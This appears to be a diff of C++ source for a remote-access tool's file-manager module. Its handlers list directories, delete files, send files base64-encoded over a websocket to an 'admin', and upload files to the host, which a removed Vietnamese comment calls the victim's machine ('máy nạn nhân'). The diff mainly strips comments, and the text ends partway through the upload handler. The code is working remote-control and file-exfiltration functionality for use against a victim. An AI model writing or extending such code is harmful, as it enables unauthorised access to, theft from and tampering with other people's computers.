@@ -5,11 +5,10 @@
 #include <vector>
 #include <iomanip>
 #include "lib.h"
-#include "encode.h" // Bắt buộc để xử lý tiếng Việt
+#include "encode.h" 
 
 namespace fs = std::filesystem;
 
-// Helper: Base64 Encode/Decode
 static const std::string base64_chars = 
              "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
              "abcdefghijklmnopqrstuvwxyz"
@@ -48,35 +47,28 @@ std::string base64_decode(const std::string &in) {
     return out;
 }
 
-// Chức năng: Liệt kê thư mục
 void handle_list_directory(std::shared_ptr<websocket::stream<tcp::socket>> ws, const std::string& pathUtf8) {
     json files = json::array();
     try {
-        // [FIX] Convert đường dẫn từ UTF-8 (Web) sang Wide String (Windows) để đọc đúng tiếng Việt
         std::wstring wPath = WinEncoding::FromUtf8(pathUtf8);
 
         if (fs::exists(wPath) && fs::is_directory(wPath)) {
             for (const auto& entry : fs::directory_iterator(wPath)) {
                 try {
                     json file;
-                    // [FIX] Convert tên file từ Wide String về UTF-8 chuẩn cho JSON
                     file["name"] = WinEncoding::ToUtf8(entry.path().filename().wstring());
                     file["is_dir"] = entry.is_directory();
                     
-                    // Lấy size an toàn (tránh lỗi permission)
                     try {
                         file["size"] = entry.is_directory() ? 0 : entry.file_size();
                     } catch (...) {
                         file["size"] = 0;
                     }
                     
-                    // Xác định loại file
                     if(entry.is_directory()) {
                         file["type"] = "Folder";
                     } else {
-                        // [FIX] Lấy đuôi file chuẩn UTF-8
                         std::string ext = WinEncoding::ToUtf8(entry.path().extension().wstring());
-                        // Normalize ext (có thể thêm toLower nếu cần)
                         if(ext == ".exe" || ext == ".dll") file["type"] = "Application";
                         else if(ext == ".txt" || ext == ".log" || ext == ".ini" || ext == ".cfg") file["type"] = "Text";
                         else if(ext == ".png" || ext == ".jpg" || ext == ".jpeg" || ext == ".bmp") file["type"] = "Image";
@@ -85,17 +77,14 @@ void handle_list_directory(std::shared_ptr<websocket::stream<tcp::socket>> ws, c
                     }
                     files.push_back(file);
                 } catch (...) {
-                    // Nếu 1 file bị lỗi (ví dụ tên quá dị), bỏ qua file đó, không crash cả folder
                     continue;
                 }
             }
         }
         
-        // [FIX] dump() nằm trong try-catch để bắt lỗi JSON
         sendMsg(*ws, "file", "DirectoryList", files.dump());
 
     } catch (const std::exception& e) {
-        // Gửi lỗi Access Denied về client thay vì ngắt kết nối
         json errorItem; 
         errorItem["name"] = "[ERROR] Access Denied: " + std::string(e.what()); 
         errorItem["is_dir"] = true; 
@@ -109,7 +98,6 @@ void handle_list_directory(std::shared_ptr<websocket::stream<tcp::socket>> ws, c
     }
 }
 
-// Chức năng: Xóa file/folder
 void handle_delete_file(const std::string& pathUtf8) {
     try {
         std::wstring wPath = WinEncoding::FromUtf8(pathUtf8);
@@ -119,13 +107,10 @@ void handle_delete_file(const std::string& pathUtf8) {
     } catch (...) {}
 }
 
-// Chức năng: Tải file về máy admin
 void handle_download_file(std::shared_ptr<websocket::stream<tcp::socket>> ws, const std::string& pathUtf8) {
     try {
         std::wstring wPath = WinEncoding::FromUtf8(pathUtf8);
         
-        // [FIX CHO MINGW] Chuyển std::wstring sang std::filesystem::path tường minh
-        // MinGW ifstream không chấp nhận std::wstring trực tiếp
         std::ifstream file(fs::path(wPath), std::ios::binary);
         
         if (!file.is_open()) return;
@@ -137,7 +122,6 @@ void handle_download_file(std::shared_ptr<websocket::stream<tcp::socket>> ws, co
         j["type"] = "file";
         j["what"] = "FileDownload";
         j["message"] = encoded;
-        // Gửi tên file gốc về để client lưu
         j["filename"] = WinEncoding::ToUtf8(fs::path(wPath).filename().wstring());
         
         ws->write(net::buffer(j.dump()));
@@ -145,7 +129,6 @@ void handle_download_file(std::shared_ptr<websocket::stream<tcp::socket>> ws, co
     } catch (...) {}
 }
 
-// Chức năng: Upload file từ admin lên máy nạn nhân
 void handle_upload_file(const std::string& pathUtf8, const std::string& filenameUtf8, const std::string& b64data) {
     try {
         std::string decoded = base64_decode(b64data);
